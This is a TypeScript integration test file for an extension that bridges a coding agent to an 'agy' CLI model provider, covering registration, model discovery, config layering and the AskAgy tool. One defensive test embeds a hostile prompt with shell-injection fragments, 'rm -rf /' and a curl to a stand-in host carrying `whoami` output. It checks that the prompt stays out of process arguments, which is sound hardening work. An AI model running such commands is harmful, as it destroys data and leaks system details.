/**
 * Integration tests for the extension factory (specs R1, R2, R3; tasks D4.1):
 * the default-exported factory wires config validation → discovery (24h
 * cache, never throws, fallback catalog) → pi.registerProvider("agy") with
 * the real streamSimple (promptViaStdin transport) → pi.registerTool(AskAgy)
 * with the lifecycle registry wired → pi.registerCommand("/agy") → the
 * session_start/session_shutdown handlers, with rebuildDiscovery catching
 * its own errors and NEVER double-registering tools/commands on reload.
 *
 * The ExtensionAPI is a recording stub; everything below it (config, store,
 * lifecycle registry, turn orchestration, the engine runAgyStream) is REAL,
 * driven by a fake spawn (scripted NDJSON child with stdin capture) and a
 * fake `agy models` runner — exactly the plan's slice-D4 harness row.
 */
import { describe, expect, test } from "bun:test";
import { EventEmitter } from "node:events";
import { Readable, Writable } from "node:stream";
import { mkdtemp } from "node:fs/promises";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import type {
	AssistantMessageEvent,
	AssistantMessageEventStream,
	Context,
	Model,
} from "@earendil-works/pi-ai";
import type { Api } from "@earendil-works/pi-ai";
import type {
	ExtensionAPI,
	ExtensionCommandContext,
	ProviderConfig,
	ToolDefinition,
} from "@earendil-works/pi-coding-agent";
import type { AgyModelsRun } from "agy-bridge-engine";
import agyExtension, { createAgyExtension } from "../extensions/index";
import { AgyConfigError } from "../src/config";
import type { ProviderModelDeclaration } from "../src/models";

// --- harness ------------------------------------------------------------------

interface RecordedProvider {
	name: string;
	config: ProviderConfig;
}

interface PiCalls {
	providers: RecordedProvider[];
	tools: ToolDefinition[];
	commands: { name: string; description?: string; handler: (args: string, ctx: ExtensionCommandContext) => Promise<void> }[];
	handlers: Record<string, ((event: never, ctx?: never) => Promise<void> | void)[]>;
}

/** Recording ExtensionAPI stub: the ONLY fake boundary in these tests. */
function stubPi(): { pi: ExtensionAPI; calls: PiCalls } {
	const calls: PiCalls = { providers: [], tools: [], commands: [], handlers: {} };
	const pi = {
		registerProvider: (name: string, config: ProviderConfig) => calls.providers.push({ name, config }),
		registerTool: (tool: ToolDefinition) => calls.tools.push(tool),
		registerCommand: (name: string, options: { description?: string; handler: (args: string, ctx: ExtensionCommandContext) => Promise<void> }) =>
			calls.commands.push({ name, description: options.description, handler: options.handler }),
		on: (event: string, handler: (event: never, ctx?: never) => Promise<void> | void) => {
			(calls.handlers[event] ??= []).push(handler);
		},
	} as unknown as ExtensionAPI;
	return { pi, calls };
}

/** Minimal ChildProcess stand-in: scripted NDJSON lines, stdin capture, optional hold. */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function fakeChild(opts: { lines?: unknown[]; exit?: number | null; hold?: boolean }) {
	// eslint-disable-next-line @typescript-eslint/no-explicit-any
	const child: any = new EventEmitter();
	child.stdout = new Readable({ read() {} });
	child.stderr = new Readable({ read() {} });
	const chunks: Buffer[] = [];
	child.stdinChunks = chunks;
	child.stdin = new Writable({
		write(chunk: Buffer, _enc: string, cb: (err?: Error | null) => void) {
			chunks.push(Buffer.from(chunk));
			cb();
		},
	});
	child.killed = false;
	child.kill = () => {
		child.killed = true;
		queueMicrotask(() => child.emit("close", null, "SIGTERM"));
		return true;
	};
	for (const line of opts.lines ?? []) child.stdout.push(Buffer.from(`${JSON.stringify(line)}\n`));
	if (!opts.hold) setTimeout(() => child.emit("close", opts.exit ?? 0, null), 10);
	return child;
}

interface SpawnRecord {
	bin: string;
	args: string[];
	cwd: string;
	// eslint-disable-next-line @typescript-eslint/no-explicit-any
	child: any;
	stdinText(): string;
}

/** spawn seam: records every engine spawn and scripts the child. */
function spawnSeam(script?: (rec: SpawnRecord, call: number) => ReturnType<typeof fakeChild>) {
	const spawns: SpawnRecord[] = [];
	const spawnFn = ((bin: string, args: string[], io: { cwd: string }) => {
		const rec: SpawnRecord = {
			bin,
			args,
			cwd: io.cwd,
			child: undefined as never,
			stdinText: () => Buffer.concat(rec.child.stdinChunks ?? []).toString(),
		};
		spawns.push(rec);
		rec.child = script !== undefined ? script(rec, spawns.length) : fakeChild({ lines: DEFAULT_LINES });
		return rec.child;
	}) as never;
	return { spawns, spawnFn };
}

const DEFAULT_LINES = [
	{ event: "init", conversation_id: "conv-1" },
	{ event: "step_update", step_update: { step_type: "tool", state: "ACTIVE", tool_name: "ls" } },
	{ event: "step_update", step_update: { step_type: "tool", state: "DONE", tool_name: "ls", duration_seconds: 0.4 } },
	SUCCESS("conv-1", "the delegated answer"),
];

function SUCCESS(conversationId: string, response: string) {
	return {
		event: "result",
		result: {
			conversation_id: conversationId,
			status: "SUCCESS",
			response,
			usage: { input_tokens: 11, output_tokens: 22, thinking_tokens: 4, cache_read_tokens: 3, total_tokens: 33 },
		},
	};
}

/** `agy models` runner seam: TSV stdout, per-call scripting, call counter. */
function runnerSeam(script?: (call: number) => Partial<AgyModelsRun> | Error) {
	let calls = 0;
	const runner = (bin: string): AgyModelsRun => {
		calls++;
		const got = script?.(calls);
		if (got instanceof Error) throw got;
		return { stdout: TSV_A, exitCode: 0, ...got };
	};
	return { runner, callCount: () => calls };
}

const TSV_A = "agy v1.1.28\nother-model\tOther Model\n";
const TSV_TIERS = "agy v1.1.28\ngemini-3.8-flash-high\tFlash High\ngemini-3.8-flash-medium\tFlash Med\ngemini-3.8-flash-low\tFlash Low\n";

/** Isolated factory environment: tmp stateDir, fast timeout, optional seams. */
async function factoryEnv(overrides: {
	runner?: ReturnType<typeof runnerSeam>;
	spawn?: ReturnType<typeof spawnSeam>;
	options?: Record<string, unknown>;
	skillsCatalog?: () => string | undefined;
} = {}) {
	const root = await mkdtemp(join(tmpdir(), "agy-pi-factory-"));
	const { pi, calls } = stubPi();
	const spawn = overrides.spawn ?? spawnSeam();
	const runner = overrides.runner ?? runnerSeam();
	// Hermetic file layer: empty tmp global/project dirs so the host's real
	// ~/.pi/agent/agy-bridge.json can never leak into registration/notice rows.
	const fileConfig = { cwd: join(root, "proj-empty"), agentDir: join(root, "agent-empty") };
	const load = () =>
		createAgyExtension(pi, {
			options: { stateDir: root, timeoutMs: 30_000, ...overrides.options },
			runner: runner.runner,
			spawnFn: spawn.spawnFn,
			now: () => 1_000,
			fileConfig,
			...(overrides.skillsCatalog !== undefined ? { skillsCatalog: overrides.skillsCatalog } : {}),
		});
	return { root, pi, calls, spawn, runner, load };
}

/** Stub host + runner only (for the pre-validation row: no fs env needed). */
function stubPiAndRunner() {
	const { pi, calls } = stubPi();
	const runner = runnerSeam();
	return { pi, calls, runner };
}

/** Command-context stub: notify capture, empty session id → cwd-keyed like the tool path. */
function commandCtx(cwd: string, notifications: string[]): ExtensionCommandContext {
	return {
		cwd,
		sessionManager: { getSessionId: () => "", getCwd: () => cwd },
		ui: { notify: (msg: string) => notifications.push(msg) },
	} as unknown as ExtensionCommandContext;
}

/** Provider model declaration → the Model pi would hand streamSimple. */
function asModel(decl: ProviderModelDeclaration): Model<Api> {
	return { ...decl, api: "agy-stream-json" as Api, provider: "agy", baseUrl: "agy://bridge" } as unknown as Model<Api>;
}

async function drain(stream: AssistantMessageEventStream): Promise<AssistantMessageEvent[]> {
	const events: AssistantMessageEvent[] = [];
	for await (const ev of stream) events.push(ev);
	return events;
}

/** Decode the ONE NDJSON user envelope the stdin transport writes. */
function stdinContent(rec: SpawnRecord): string {
	const raw = rec.stdinText();
	const lines = raw.split("\n").filter((l) => l !== "");
	if (lines.length !== 1) throw new Error(`expected exactly one NDJSON stdin line, got ${lines.length}: ${raw}`);
	return JSON.parse(lines[0]).message.content as string;
}

// --- tests --------------------------------------------------------------------

describe("integration: extensions/index — factory glue (R1, R2, R3)", () => {
	test("module contract: default export is the pi factory (arity 1); createAgyExtension is the seam", () => {
		expect(typeof agyExtension).toBe("function");
		expect(agyExtension.length).toBe(1);
		expect(typeof createAgyExtension).toBe("function");
	});

	test("R12: invalid config throws AgyConfigError BEFORE any registration or spawn (relative stateDir)", async () => {
		const { pi, calls, runner } = stubPiAndRunner();
		let threw: unknown;
		try {
			await createAgyExtension(pi, {
				options: { stateDir: "relative/nope", timeoutMs: 30_000 },
				runner: runner.runner,
			});
		} catch (err) {
			threw = err;
		}
		expect(threw).toBeInstanceOf(AgyConfigError);
		expect((threw as AgyConfigError).code).toBe("AGY_CONFIG_INVALID");
		expect(calls.providers).toHaveLength(0);
		expect(calls.tools).toHaveLength(0);
		expect(calls.commands).toHaveLength(0);
		expect(Object.keys(calls.handlers)).toHaveLength(0);
		expect(runner.callCount()).toBe(0); // the discovery probe never ran
	});

	test("R1/R2: registers provider agy (default first, 1M/65536, text-only, zero cost), /agy, and both lifecycle handlers — each exactly once; AskAgy stays OFF by default (v0.2 R3)", async () => {
		const { calls, runner, load } = await factoryEnv();
		await load();
		expect(runner.callCount()).toBe(1);
		expect(calls.providers).toHaveLength(1);
		const { name, config } = calls.providers[0];
		expect(name).toBe("agy");
		// pi contract (provider-composer): streamSimple REQUIRES provider-level
		// api (models inherit it and route model.api === extension.api).
		expect(config.api).toBe("agy-stream-json");
		expect(typeof config.baseUrl).toBe("string");
		expect(typeof config.streamSimple).toBe("function");
		const models = config.models ?? [];
		expect(models[0]).toMatchObject({
			id: "default",
			name: "default",
			reasoning: false,
			input: ["text"],
			contextWindow: 1_000_000, // design-pinned defaults stay as implemented
			maxTokens: 65_536,
		});
		expect(models[0].cost).toEqual({ input: 0, output: 0, cacheRead: 0, cacheWrite: 0 });
		expect(calls.tools).toHaveLength(0); // v0.2 R3 behavior change: AskAgy is opt-in
		expect(calls.commands).toHaveLength(1);
		expect(calls.commands[0].name).toBe("agy");
		expect(calls.commands[0].description).toBeTruthy();
		expect(calls.handlers["session_start"]).toHaveLength(1);
		expect(calls.handlers["session_shutdown"]).toHaveLength(1);
	});

	test("R2: discovery feeds the registry through the factory — effort tiers collapse with full-id thinkingLevelMap", async () => {
		const { calls, load } = await factoryEnv({ runner: runnerSeam(() => ({ stdout: TSV_TIERS })) });
		await load();
		const models = calls.providers[0].config.models ?? [];
		const ids = models.map((m) => m.id);
		expect(ids[0]).toBe("default");
		expect(ids).toContain("gemini-3.8-flash");
		expect(ids).not.toContain("gemini-3.8-flash-high"); // collapsed into the base
		const flash = models.find((m) => m.id === "gemini-3.8-flash");
		expect(flash?.reasoning).toBe(true);
		expect(flash?.thinkingLevelMap?.high).toBe("gemini-3.8-flash-high");
		expect(flash?.thinkingLevelMap?.medium).toBe("gemini-3.8-flash-medium");
		expect(flash?.thinkingLevelMap?.off).toBeNull();
	});

	test("R2: failed/empty discovery NEVER throws — fallback catalog serves, empty rounds never poison the cache", async () => {
		const { calls, runner, load } = await factoryEnv({ runner: runnerSeam(() => ({ stdout: "", exitCode: 1 })) });
		await load(); // must not reject
		const models = calls.providers[0].config.models ?? [];
		expect(ids0(models)).toEqual(["default", "gemini-3.8-flash"]); // fallback collapsed catalog
		expect(runner.callCount()).toBe(1);
		// No discovery cache entry: /agy status reports "no discovery cache".
		const notes: string[] = [];
		await calls.commands[0].handler("status", commandCtx("/proj", notes));
		expect(notes[0]).toContain("no discovery cache");
	});

	test("R12: config models overrides reach the registered provider through the factory", async () => {
		const { calls, load } = await factoryEnv({
			runner: runnerSeam(() => ({ stdout: "", exitCode: 1 })),
			options: {
				models: {
					"gemini-3.8-flash": { name: "Flash Custom", limit: { context: 200_000, output: 8_192 } },
				},
			},
		});
		await load();
		const flash = (calls.providers[0].config.models ?? []).find((m) => m.id === "gemini-3.8-flash");
		expect(flash?.name).toBe("Flash Custom");
		expect(flash?.contextWindow).toBe(200_000);
		expect(flash?.maxTokens).toBe(8_192);
	});

	test("R3 E2E: the registered streamSimple returns SYNCHRONOUSLY and streams the full event sequence for a fake NDJSON turn", async () => {
		const { calls, load } = await factoryEnv();
		await load();
		const streamSimple = calls.providers[0].config.streamSimple!;
		const context: Context = { messages: [{ role: "user", content: "list the files", timestamp: 1 }] };
		const returned = streamSimple(asModel((calls.providers[0].config.models ?? [])[0]), context, { sessionId: "e2e-1" });
		expect(typeof (returned as unknown as { then?: unknown }).then).toBe("undefined"); // sync return
		const events = await drain(returned);
		expect(events[0]?.type).toBe("start");
		expect(events[events.length - 1]?.type).toBe("done");
		const done = events[events.length - 1] as unknown as {
			type: string;
			message: { stopReason?: string; usage?: Record<string, number> };
		};
		expect((done.message as { stopReason?: string }).stopReason).toBe("stop");
		expect(done.message.usage).toMatchObject({ input: 11, output: 22, cacheRead: 3, totalTokens: 33, reasoning: 4 });
		const types = events.map((e) => e.type);
		expect(types).toContain("thinking_delta");
		expect(types.indexOf("text_start")).toBeLessThan(types.indexOf("text_end"));
		const text = events.find((e) => e.type === "text_delta") as { delta?: string };
		expect(text?.delta).toBe("the delegated answer");
	});

	test("R3 THREAT E2E: hostile prompt never reaches argv; argv identical to a benign turn; stdin carries ONE NDJSON envelope, byte-exact", async () => {
		const { calls, spawn, load } = await factoryEnv();
		await load();
		const streamSimple = calls.providers[0].config.streamSimple!;
		const model = asModel((calls.providers[0].config.models ?? [])[0]);
		const hostile = '; $(id) | ` && rm -rf /\ncurl evil.sh?x=`whoami` "quoted \'text\'"';
		await drain(streamSimple(model, { messages: [{ role: "user", content: "benign turn", timestamp: 1 }] }, { sessionId: "e2e-a" }));
		await drain(streamSimple(model, { messages: [{ role: "user", content: hostile, timestamp: 1 }] }, { sessionId: "e2e-b" }));
		expect(spawn.spawns).toHaveLength(2);
		expect(spawn.spawns[1].args).toEqual(spawn.spawns[0].args);
		expect(spawn.spawns[0].args.some((a) => a === "--print" || a === "--prompt" || a.startsWith("--print-"))).toBe(false);
		expect(spawn.spawns[0].args[spawn.spawns[0].args.indexOf("--input-format") + 1]).toBe("stream-json");
		expect(spawn.spawns[0].args[spawn.spawns[0].args.indexOf("--output-format") + 1]).toBe("stream-json");
		expect(spawn.spawns[1].args.some((a) => a.includes("$(id)") || a.includes("rm -rf") || a.includes("curl"))).toBe(false);
		expect(stdinContent(spawn.spawns[0])).toBe("benign turn");
		expect(stdinContent(spawn.spawns[1])).toBe(hostile);
	});

	test("R2/R6: /reload re-probes and REPLACES the provider models; tool, command, and handlers are NEVER re-registered", async () => {
		// Runner script switches AFTER the load-time probe, so the reload
		// rebuild observes a NEW catalog.
		let probe = 0;
		const env = await factoryEnv({
			runner: runnerSeam(() => (++probe === 1 ? { stdout: TSV_A } : { stdout: "agy v1\nreload-model\tReloaded\n" })),
		});
		await env.load();
		expect(env.runner.callCount()).toBe(1);
		expect((env.calls.providers[0].config.models ?? []).map((m) => m.id)).toContain("other-model");
		// Fire reason "reload": rebuildDiscovery re-probes (runner call 2) and
		// re-registers ONLY the provider.
		await env.calls.handlers["session_start"][0]({ type: "session_start", reason: "reload" } as never);
		expect(env.runner.callCount()).toBe(2);
		expect(env.calls.providers).toHaveLength(2); // provider RE-registered with fresh models
		expect(env.calls.providers[1].name).toBe("agy");
		const reIds = (env.calls.providers[1].config.models ?? []).map((m) => m.id);
		expect(reIds).toContain("reload-model");
		expect(reIds).not.toContain("other-model");
		expect(env.calls.tools).toHaveLength(0); // v0.2 R3: no AskAgy by default, and reload must not register one either
		expect(env.calls.commands).toHaveLength(1);
		expect(env.calls.handlers["session_start"]).toHaveLength(1);
		expect(env.calls.handlers["session_shutdown"]).toHaveLength(1);
		// The refreshed cache is visible through /agy status.
		const notes: string[] = [];
		await env.calls.commands[0].handler("status", commandCtx("/proj", notes));
		expect(notes[0]).toContain("1 discovered");
		expect(notes[0]).toContain("fresh");
	});

	test("R6: a FAILED rebuild probe never breaks /reload — no re-registration, no cache poisoning", async () => {
		let probe = 0;
		const env = await factoryEnv({
			runner: runnerSeam(() => (++probe === 1 ? { stdout: TSV_A } : { stdout: "", exitCode: 1 })),
		});
		await env.load();
		await env.calls.handlers["session_start"][0]({ type: "session_start", reason: "reload" } as never); // must not reject
		expect(env.calls.providers).toHaveLength(1); // keeps the load-time registry
		expect(env.calls.tools).toHaveLength(0); // v0.2 R3: no AskAgy by default
		expect(env.runner.callCount()).toBe(2);
	});

	test("R6: session_start 'startup'/'new' and session_shutdown never re-probe or re-register", async () => {
		const env = await factoryEnv();
		await env.load();
		await env.calls.handlers["session_start"][0]({ type: "session_start", reason: "startup" } as never);
		await env.calls.handlers["session_start"][0]({ type: "session_start", reason: "new" } as never);
		await env.calls.handlers["session_shutdown"][0]({ type: "session_shutdown", reason: "quit" } as never);
		expect(env.runner.callCount()).toBe(1);
		expect(env.calls.providers).toHaveLength(1);
	});

	test("R6/R10: AskAgy's state wiring — an in-flight delegation is visible in /agy status, then clears (same cwd key)", async () => {
		const { calls, spawn, load, root } = await factoryEnv({
			options: { askAgy: { enabled: true } }, // v0.2 R3: the tool only exists when enabled
			spawn: spawnSeam(() => fakeChild({ lines: DEFAULT_LINES, hold: true })),
		});
		await load();
		const tool = calls.tools[0];
		const projDir = join(root, "proj");
		const pending = tool.execute(
			"call-1",
			{ prompt: "long sub-task" } as never,
			undefined,
			undefined,
			{ cwd: projDir, model: { provider: "other" } } as never,
		);
		// Wait until the turn registers in-flight (bounded poll on /agy status).
		const notes: string[] = [];
		let status = "";
		for (let i = 0; i < 50 && !status.includes("in flight"); i++) {
			notes.length = 0;
			await calls.commands[0].handler("status", commandCtx(projDir, notes));
			status = notes[0] ?? "";
			if (!status.includes("in flight")) await new Promise((r) => setTimeout(r, 5));
		}
		expect(status).toContain("turn: in flight");
		// The delegation rides the corrected stdin transport too.
		expect(spawn.spawns.length).toBeGreaterThanOrEqual(1);
		expect(stdinContent(spawn.spawns[0])).toBe("long sub-task");
		// Give the engine's readline a macrotask window to drain the held
		// child's buffered NDJSON before the close event ends the run.
		await new Promise((r) => setTimeout(r, 25));
		spawn.spawns[0].child.emit("close", 0, null);
		const result = await pending;
		expect((result as { content: { type: string; text: string }[] }).content[0].text).toBe("the delegated answer");
		notes.length = 0;
		await calls.commands[0].handler("status", commandCtx(projDir, notes));
		expect(notes[0]).toContain("turn: idle");
	});
});

function ids0(models: ProviderModelDeclaration[]): string[] {
	return models.map((m) => m.id);
}

// --- v0.2 S1: layered file config feeding the factory (R1, D10) ----------------

/**
 * Factory environment with REAL tmp config files: the loader runs for real
 * against an injected global agent dir and project cwd, so the precedence
 * rows exercise the whole file→layer→resolveConfig→registration chain.
 */
function fileFactoryEnv(files: { global?: string; project?: string }, options: Record<string, unknown> = {}) {
	const { pi, calls } = stubPi();
	const runner = runnerSeam();
	const root = mkdtempSync(join(tmpdir(), "agy-pi-filecfg-"));
	const agentDir = join(root, "agent");
	const project = join(root, "proj");
	mkdirSync(agentDir, { recursive: true });
	mkdirSync(join(project, ".pi"), { recursive: true });
	if (files.global !== undefined) writeFileSync(join(agentDir, "agy-bridge.json"), files.global);
	if (files.project !== undefined) writeFileSync(join(project, ".pi", "agy-bridge.json"), files.project);
	const load = () =>
		createAgyExtension(pi, {
			options: { timeoutMs: 30_000, ...options },
			runner: runner.runner,
			fileConfig: { cwd: project, agentDir },
		});
	return { calls, runner, load };
}

/** The registered display name pi would show for one model id. */
function modelName(calls: PiCalls, id: string): string | undefined {
	const models = (calls.providers[0]?.config.models ?? []) as ProviderModelDeclaration[];
	return models.find((m) => m.id === id)?.name;
}

describe("integration: extensions/index — layered file config (v0.2 R1, D10)", () => {
	test("R1: the factory loads the file layer — project file wins over global", async () => {
		const { calls, load } = fileFactoryEnv({
			global: JSON.stringify({ models: { "other-model": { name: "FROM-GLOBAL" } } }),
			project: JSON.stringify({ models: { "other-model": { name: "FROM-PROJECT" } } }),
		});
		await load();
		expect(calls.providers).toHaveLength(1);
		expect(modelName(calls, "other-model")).toBe("FROM-PROJECT");
	});

	test("explicit factory options beat the file layer (per key, both layers land)", async () => {
		const { calls, load } = fileFactoryEnv(
			{
				global: JSON.stringify({ models: { "other-model": { name: "FROM-GLOBAL" } } }),
				project: JSON.stringify({
					models: { "other-model": { name: "FROM-PROJECT" }, "extra-model": { name: "FROM-PROJECT-ONLY" } },
				}),
			},
			{ models: { "other-model": { name: "FROM-EXPLICIT" } } },
		);
		await load();
		expect(modelName(calls, "other-model")).toBe("FROM-EXPLICIT");
		expect(modelName(calls, "extra-model")).toBe("FROM-PROJECT-ONLY");
	});

	test("a malformed global file warns and the factory continues with the project layer", async () => {
		const { calls, load } = fileFactoryEnv({
			global: "{oops",
			project: JSON.stringify({ models: { "other-model": { name: "FROM-PROJECT" } } }),
		});
		await load();
		expect(calls.providers).toHaveLength(1);
		expect(modelName(calls, "other-model")).toBe("FROM-PROJECT");
	});

	test("file values pass the single validation gate: a relative file stateDir throws BEFORE any registration", async () => {
		const { pi, calls, runner } = stubPiAndRunner();
		const root = mkdtempSync(join(tmpdir(), "agy-pi-filecfg-"));
		const project = join(root, "proj");
		mkdirSync(join(project, ".pi"), { recursive: true });
		writeFileSync(join(project, ".pi", "agy-bridge.json"), JSON.stringify({ stateDir: "relative/nope" }));
		let threw: unknown;
		try {
			await createAgyExtension(pi, {
				options: { timeoutMs: 30_000 },
				runner: runner.runner,
				fileConfig: { cwd: project, agentDir: join(root, "agent") },
			});
		} catch (error) {
			threw = error;
		}
		expect(threw).toBeInstanceOf(AgyConfigError);
		expect((threw as AgyConfigError).field).toBe("stateDir");
		expect(calls.providers).toHaveLength(0);
		expect(calls.tools).toHaveLength(0);
		expect(runner.callCount()).toBe(0);
	});
});

// --- v0.2 S2: conditional AskAgy registration + overrides + notice (R3, R4) ----

/**
 * session_start ctx stub capturing ui.notify — the R3 notice surface
 * (pi's ExtensionHandler passes (event, ctx) with ctx.hasUI + ctx.ui).
 */
function startCtx(notes: string[], hasUI = true): never {
	return { hasUI, ui: { notify: (msg: string) => notes.push(msg) } } as never;
}

describe("integration: extensions/index — conditional AskAgy registration + startup notice (v0.2 R3)", () => {
	test("R3: askAgy section ABSENT → NO AskAgy and exactly ONE one-time notice on the first session_start", async () => {
		const { calls, load } = await factoryEnv();
		await load();
		expect(calls.tools).toHaveLength(0);
		const notes: string[] = [];
		await calls.handlers["session_start"][0]({ type: "session_start", reason: "startup" } as never, startCtx(notes));
		expect(notes).toHaveLength(1);
		expect(notes[0]).toContain("AskAgy");
		expect(notes[0]).toContain("enabled"); // the enable hint is discoverable
		// One-time: a second session_start (reload/new/…) never repeats it.
		await calls.handlers["session_start"][0]({ type: "session_start", reason: "reload" } as never, startCtx(notes));
		expect(notes).toHaveLength(1);
	});

	test("R3: the notice surfaces file-config warnings (the S1 file.warnings path)", async () => {
		const { calls, load } = await fileFactoryEnv({ global: "{oops" });
		await load();
		expect(calls.tools).toHaveLength(0);
		const notes: string[] = [];
		await calls.handlers["session_start"][0]({ type: "session_start", reason: "startup" } as never, startCtx(notes));
		expect(notes).toHaveLength(1);
		expect(notes[0]).toContain("config warning");
		expect(notes[0]).toContain("malformed");
	});

	test("R3: enabled:false → no tool and NO notice (explicit opt-out is silent)", async () => {
		const { calls, load } = await factoryEnv({ options: { askAgy: { enabled: false } } });
		await load();
		expect(calls.tools).toHaveLength(0);
		const notes: string[] = [];
		await calls.handlers["session_start"][0]({ type: "session_start", reason: "startup" } as never, startCtx(notes));
		expect(notes).toHaveLength(0);
	});

	test("R3: enabled:true → AskAgy registered exactly once (explicit options or project file layer)", async () => {
		const explicit = await factoryEnv({ options: { askAgy: { enabled: true } } });
		await explicit.load();
		expect(explicit.calls.tools).toHaveLength(1);
		expect(explicit.calls.tools[0].name).toBe("AskAgy");
		const notes: string[] = [];
		await explicit.calls.handlers["session_start"][0]({ type: "session_start", reason: "startup" } as never, startCtx(notes));
		expect(notes).toHaveLength(0); // registered → no notice
		const fromFile = await fileFactoryEnv({ project: JSON.stringify({ askAgy: { enabled: true } }) });
		await fromFile.load();
		expect(fromFile.calls.tools).toHaveLength(1);
		expect(fromFile.calls.tools[0].name).toBe("AskAgy");
		// Schema shape through the factory (formerly pinned by the smoke test,
		// whose plain invocation registers no tool under R3).
		const params = fromFile.calls.tools[0].parameters as { required?: string[]; properties: Record<string, unknown> };
		expect(params.required).toEqual(["prompt"]);
		expect(Object.keys(params.properties).sort()).toEqual(["isolated", "model", "prompt", "scope", "skills", "thinking"]);
	});
});

// --- v0.2 S2 R4: askAgy defaults + overrides reach the registered tool -----------

/** Execute the factory-registered AskAgy tool with a minimal tool ctx. */
async function runTool(
	calls: PiCalls,
	params: Record<string, unknown>,
	cwd: string,
): Promise<{ text: string; details: { isolated: boolean; skillsInjected: boolean } }> {
	const tool = calls.tools[0];
	const result = (await tool.execute(
		"call-1",
		params as never,
		undefined,
		undefined,
		{ cwd, model: { provider: "other" } } as never,
	)) as { content: { type: string; text: string }[]; details: { isolated: boolean; skillsInjected: boolean } };
	return { text: result.content.map((c) => c.text).join(""), details: result.details };
}

describe("integration: extensions/index — askAgy defaults reach the tool (v0.2 R4)", () => {
	test("R4: defaultIsolated becomes the tool's effective default; explicit isolated:false still wins", async () => {
		const env = await factoryEnv({ options: { askAgy: { enabled: true, defaultIsolated: true } } });
		await env.load();
		const projDir = join(env.root, "proj");
		const first = await runTool(env.calls, { prompt: "one-shot by default" }, projDir);
		expect(first.details.isolated).toBe(true); // config default applied
		const second = await runTool(env.calls, { prompt: "explicit wins", isolated: false }, projDir);
		expect(second.details.isolated).toBe(false); // explicit caller param beats config
	});

	test("R4: without defaultIsolated the v0.1 default (session continuity) is preserved", async () => {
		const env = await factoryEnv({ options: { askAgy: { enabled: true } } });
		await env.load();
		const { details } = await runTool(env.calls, { prompt: "continuity please" }, "/proj");
		expect(details.isolated).toBe(false);
	});

	test("R4: appendSkills seam — the deps catalog reaches the tool by default; appendSkills:false withholds it", async () => {
		const withCatalog = await factoryEnv({
			options: { askAgy: { enabled: true } },
			skillsCatalog: () => "- my-skill: does things",
		});
		await withCatalog.load();
		await runTool(withCatalog.calls, { prompt: "use a skill please", skills: true, isolated: true }, "/proj");
		expect(stdinContent(withCatalog.spawn.spawns[0])).toContain("- my-skill: does things");
		const withoutCatalog = await factoryEnv({
			options: { askAgy: { enabled: true, appendSkills: false } },
			skillsCatalog: () => "- my-skill: does things",
		});
		await withoutCatalog.load();
		await runTool(withoutCatalog.calls, { prompt: "withheld", skills: true, isolated: true }, "/proj");
		expect(stdinContent(withoutCatalog.spawn.spawns[0])).toBe("withheld"); // seam disabled by config
	});
});
